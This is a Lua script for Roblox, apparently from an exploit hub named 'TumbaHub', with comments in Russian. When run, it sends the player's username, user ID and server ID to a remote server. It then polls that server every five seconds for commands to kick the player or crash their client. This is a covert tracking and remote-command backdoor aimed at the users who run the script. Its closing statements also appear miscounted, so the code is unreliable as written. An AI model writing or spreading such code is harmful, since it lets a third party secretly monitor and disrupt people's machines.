-- === TELEGRAM BOT NOTIFIER (Отправка инфы на сервер) ===
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    -- ВАЖНО: Вставь сюда свою ссылку из Render!
    local SERVER_URL = "https://tumbahub-server.onrender.com/api/log_user" 

    local userData = {
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        jobId = game.JobId
    }

    local requestFunc = request or http_request or (syn and syn.request) or (http and http.request)
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = SERVER_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(userData)
            })
        end)
            
        -- === ЦИКЛ ПОЛУЧЕНИЯ КОМАНД ===
        while task.wait(5) do -- Запрашиваем команды каждые 5 секунд
            local success, result = pcall(function()
                return requestFunc({
                    Url = "https://tumbahub-server.onrender.com/api/get_command?username=" .. LocalPlayer.Name,
                    Method = "GET"
                })
            end)

            if success and result and result.Body then
                -- Пытаемся расшифровать JSON ответ от сервера
                local decodeSuccess, data = pcall(function()
                    return HttpService:JSONDecode(result.Body)
                end)
                
                -- Если сервер ответил success и прислал команду
                if decodeSuccess and data and data.status == "success" and data.command then
                    local cmd = data.command
                    
                    -- === ИСПОЛНЕНИЕ КОМАНД ===
                    
                    -- 1. Обычный кик без причины
                    if cmd == "/kick" then
                        LocalPlayer:Kick("Вы были кикнуты администратором TumbaHub.")
                        
                    -- 2. Кик с кастомной причиной (ищем совпадение начала строки)
                    elseif string.find(cmd, "^/kick_") then
                        -- Вырезаем текст причины (все, что идет после 6-го символа "/kick_")
                        local customReason = string.sub(cmd, 7)
                        LocalPlayer:Kick(customReason)
                        
                    -- 3. Краш клиента
                    elseif cmd == "/crash" then
                        while true do end 

                    -- =========================
                end -- Закрывает проверку decodeSuccess
            end -- Закрывает проверку success
        end -- Закрывает цикл while task.wait
    end -- Закрывает проверку if requestFunc
end) -- Закрывает task.spawn(function()
-- ========================================================
